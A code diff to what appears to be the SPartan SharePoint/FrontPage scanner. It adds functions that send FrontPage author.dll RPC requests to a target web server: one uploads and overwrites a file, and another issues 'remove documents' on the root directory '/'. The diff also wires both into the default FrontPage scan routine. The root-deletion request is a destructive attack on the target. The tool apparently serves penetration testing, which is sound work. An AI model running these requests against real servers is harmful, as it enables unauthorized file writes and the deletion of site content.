@@ -209,7 +209,10 @@ def frontpage_rpc(url):
             thread.sendData(url + '/' + path, data)
             resp = thread.resp
             if resp is not None and resp.status_code == 200:
+                print ("[+] Query rpc executed successfully - (%s) | (%s) !\n" % (data, resp.status_code))
                 print(resp.text)
+            else:
+                print ("[-] Query rpc fails at  - (%s) | (%s) !\n" %(data,resp.status_code))
 
 
 def query_rpc(url, query):
@@ -237,10 +240,46 @@ def query_rpc(url, query):
 
 
 def frontpage_fileup(url):
-    return
+    # running some standard commands to upload file to  web server using author.dll
+    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803, 5.0.2.2623 , 6.0.2.5420
+
+    os.system("echo 'SPartan Testing !' > spartan.txt")
+    paths = ['_vti_bin/_vti_aut/author.dll']
+    dataList = ['method=put document:3.0.2.1706&service_name=&document=[document_name=spartan.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false','method=put document:4.0.2.4715&service_name=&document=[document_name=spartan.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false','method=put document:5.0.2.2623&service_name=&document=[document_name=spartan.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false','method=put document:5.0.2.4823&service_name=&document=[document_name=spartan.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false','method=put document:6.0.2.5420&service_name=&document=[document_name=spartan.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false']
+
+    for path in paths:
+        for data in dataList:
+            print ("[+] Sending HTTP POST request to upload file to - (%s)" % (url + '/' + path))
+            thread = URLThread(None)
+            thread.start()
+            thread.join()
+            thread.sendData(url + '/' + path, data)
+            resp = thread.resp
+            if resp is not None and resp.status_code == 200:
+                print ("[+] file uploaded successfully - (%s) | (%s) !\n" % (data, resp.status_code))
+                print(resp.text)
+            else:
+                print ("[-] fails to upload file to  - (%s) | (%s) !\n" %(data,resp.status_code))
+    return    
 
 
 def frontpage_folder_del(url):
+    paths = ['_vti_bin/_vti_aut/author.dll']
+    dataList = ['method=remove+documents:3.0.2.1786&service_name=/','method=remove+documents:4.0.2.4715&service_name=/','method=remove+documents:5.0.3.4803&service_name=/','method=remove+documents:5.0.2.4803&service_name=/','method=remove+documents:6.0.2.5420&service_name=/']
+
+    for path in paths:
+        for data in dataList:
+            print ("[+] Sending HTTP POST request to remove '/' directory to - (%s)" % (url + '/' + path))
+            thread = URLThread(None)
+            thread.start()
+            thread.join()
+            thread.sendData(url + '/' + path, data)
+            resp = thread.resp
+            if resp is not None and resp.status_code == 200:
+                print ("[+] folder removed successfully - (%s) | (%s) !\n" % (data, resp.status_code))
+                print(resp.text)
+            else:
+                print ("[-] fails to remove '/' folder to  - (%s) | (%s) !\n" %(data,resp.status_code))
     return
 
 
@@ -861,7 +900,15 @@ if __name__ == "__main__":
                     print ("[+] Initiating Frontpage service scan...")
                     frontpage_services(url)
                     print("\n-----------------------------------------------------------------------------")
-                    # print "[+] Initiating Frontpage RPC scan..."
+                    print ("[+] Initiating Frontpage RPC scan...")
+                    frontpage_rpc(url)
+                    print("\n-----------------------------------------------------------------------------")
+                    print ("[+] Initiating Frontpage DELETE Folder scan...")
+                    frontpage_folder_del(url)
+                    print("\n-----------------------------------------------------------------------------")
+                    print ("[+] Initiating Frontpage upload document scan...")
+                    frontpage_fileup(url)
+                    print("\n-----------------------------------------------------------------------------")
                 if args.sharepoint:
                     print("\n-----------------------------------------------------------------------------")
                     print ("[+] Initiating Sharepoint fingerprinting...")
